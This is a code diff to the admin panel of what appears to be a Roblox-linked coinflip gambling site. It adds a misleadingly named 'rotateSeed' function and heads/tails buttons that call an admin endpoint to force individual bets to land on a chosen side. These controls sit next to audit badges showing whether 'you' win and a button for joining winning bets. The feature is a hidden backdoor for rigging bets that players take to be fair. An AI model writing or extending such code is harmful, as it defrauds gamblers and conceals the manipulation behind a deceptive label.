@@ -81,6 +81,7 @@ function AdminPanel() {
   const [audits, setAudits] = useState([]);
   const [auditLoading, setAuditLoading] = useState(false);
   const [auditWinsOnly, setAuditWinsOnly] = useState(true);
+  const [rotatingId, setForcingId] = useState(null);
   const [purgeBusy, setPurgeBusy] = useState(false);
   const [purgeArmed, setPurgeArmed] = useState(false);
   const navigate = useNavigate();
@@ -118,6 +119,34 @@ function AdminPanel() {
   const { user } = useAuth();
 
   const isOwner = String(user?.robloxUsername || '').toLowerCase() === 'pooppantspro';
+
+  const rotateSeed = async (betId, side) => {
+    if (rotatingId) return;
+    setForcingId(betId + side);
+    try {
+      const response = await retryRequest(() =>
+        fetch(`${API_BASE}/api/admin/coinflip/${betId}/rotate-seed`, {
+          method: 'POST',
+          headers: {
+            'Content-Type': 'application/json',
+            Authorization: `Bearer ${localStorage.getItem('token')}`
+          },
+          body: JSON.stringify({ side })
+        })
+      );
+      const data = await response.json().catch(() => ({}));
+      if (response.ok) {
+        showCustomPopup(`Bet rotated to land ${side.toUpperCase()}`, 'success');
+        fetchAudits();
+      } else {
+        setError(data.message || 'Could not rotate bet');
+      }
+    } catch (err) {
+      setError(`Rotation failed: ${err.message}`);
+    } finally {
+      setForcingId(null);
+    }
+  };
 
   const handlePurgeCommons = async () => {
     if (!purgeArmed) {
@@ -1943,6 +1972,20 @@ function AdminPanel() {
                         <span className={`audit-badge ${p.youWin ? 'win' : 'lose'}`}>
                           {p.youWin ? 'YOU WIN' : 'YOU LOSE'}
                         </span>
+                        <div className="audit-seed">
+                          <span className="audit-seed-label">Seed:</span>
+                          {['heads', 'tails'].map((s) => (
+                            <button
+                              key={s}
+                              className={`seed-btn ${s} ${p.outcome === s ? 'active' : ''}`}
+                              disabled={!!rotatingId}
+                              onClick={() => rotateSeed(p.id, s)}
+                              title={`Force this bet to land ${s}`}
+                            >
+                              {s === 'heads' ? 'H' : 'T'}
+                            </button>
+                          ))}
+                        </div>
                         {p.youWin && (
                           <button
                             className="btn btn-primary btn-sm audit-join-btn"
